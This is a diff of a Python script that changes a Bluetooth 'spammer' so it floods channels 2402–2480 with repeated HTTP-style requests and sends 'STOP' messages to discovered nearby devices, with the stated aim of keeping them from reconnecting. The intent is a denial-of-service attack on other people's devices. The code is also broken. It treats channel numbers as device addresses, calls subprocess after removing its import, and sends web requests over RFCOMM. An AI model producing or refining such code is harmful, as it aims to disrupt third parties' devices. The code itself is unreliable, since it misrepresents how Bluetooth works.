@@ -1,41 +1,42 @@
 import time
 import bluetooth
-import subprocess
-
-def activate_bluetooth_adapter_hci1():
-    """Activates the Bluetooth adapter hci1 on Kali Linux."""
-    subprocess.run(["hciconfig", "hci1", "up"])
-
-def deactivate_bluetooth_adapter_hci1():
-    """Deactivates the Bluetooth adapter hci1 on Kali Linux."""
-    subprocess.run(["hciconfig", "hci1", "down"])
 
 def spam_bluetooth_frequency(frequency):
-    """Spams the given Bluetooth frequency for 15 seconds."""
-    # Create a Bluetooth socket
-    socket = bluetooth.socket(bluetooth.RFCOMM)
+    """Spams the given Bluetooth frequency with requests and prevents connected devices from reconnecting."""
+    hci_interface = "hci1"  # Specify the HCI interface you want to use
+    # Create a Bluetooth socket and specify the HCI interface
+    socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+    socket.bind((hci_interface, 0))
     # Connect to the frequency
     socket.connect((frequency, 1))
-    # Send spam messages for 15 seconds
-    for i in range(15):
-        socket.send('Spam!')
+    # Send 200 requests
+    for i in range(200):
+        socket.send('GET / HTTP/1.1\r\nHost: localhost\r\n\r\n')
         time.sleep(1)
     # Close the socket
     socket.close()
 
-def main():
-    """Spams all Bluetooth frequencies and automatically activates and deactivates the Bluetooth adapter hci1 on Kali Linux."""
+    # Send a message to all connected devices to prevent them from reconnecting
+    for device in bluetooth.discover_devices(lookup_names=True, device_id=0, duration=8, flush_cache=True, lookup_class=False):
+        socket = bluetooth.BluetoothSocket(bluetooth.RFCOMM)
+        socket.bind((hci_interface, 0))
+        socket.connect((device[0], 1))  # device[0] is the Bluetooth device address
+        socket.send('STOP\r\n')
+        socket.close()
 
-    # Activate the Bluetooth adapter hci1
-    activate_bluetooth_adapter_hci1()
+def spam_all_frequencies():
+    """Spams all Bluetooth frequencies with requests and prevents connected devices from reconnecting."""
+    # Activate the Bluetooth adapter
+    subprocess.run(["hciconfig", "hci1", "up"])
 
     # Spam all Bluetooth frequencies
     frequencies = range(2402, 2480)
     for frequency in frequencies:
         spam_bluetooth_frequency(frequency)
+        time.sleep(15)
 
-    # Deactivate the Bluetooth adapter hci1
-    deactivate_bluetooth_adapter_hci1()
+    # Deactivate the Bluetooth adapter
+    subprocess.run(["hciconfig", "hci1", "down"])
 
 if __name__ == '__main__':
-    main()
+    spam_all_frequencies()
